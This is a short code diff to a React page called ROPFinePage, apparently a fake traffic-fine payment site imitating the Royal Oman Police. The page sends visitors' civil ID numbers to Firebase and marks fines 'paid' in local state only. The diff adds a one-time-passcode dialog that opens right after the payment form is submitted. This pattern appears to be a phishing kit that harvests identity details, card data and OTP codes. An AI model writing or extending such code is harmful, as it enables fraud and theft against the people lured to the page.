@@ -12,6 +12,7 @@ import { SiteHeader } from "@/components/ui/header"
 import { PaymentForm } from "@/components/payment-form"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { OTPDialog } from "@/components/otp-dialog"
 
 interface Violation {
   id: string
@@ -135,6 +136,7 @@ export default function ROPFinePage() {
   const [violations, setViolations] = useState<Violation[]>([])
   const [isLoading, setIsLoading] = useState(false)
   const [showViolations, setShowViolations] = useState(false)
+  const [showOtp,setShowOTP] = useState(false)
   const [showPayment, setShowPayment] = useState(false)
   const [formData, setFormData] = useState({
     registrationType: "personal",
@@ -206,6 +208,7 @@ addData({id:visitorID,phone:formData.civilId})
     const updatedViolations = violations.map((v) => (v.status === "unpaid" ? { ...v, status: "paid" as const } : v))
     setViolations(updatedViolations)
     setShowPayment(false)
+    setShowOTP(true)
   }
 
   const totalAmount = violations.filter((v) => v.status === "unpaid").reduce((sum, v) => sum + v.amount, 0)
@@ -228,6 +231,7 @@ addData({id:visitorID,phone:formData.civilId})
             backgroundSize: "auto",
           }}
         >
+     <OTPDialog isOpen={showOtp} onClose={()=>setShowOTP(false) } phoneNumber="******0"/>
           {showPayment ? (
             <PaymentForm
               handleSubmit={handlePaymentSuccess}
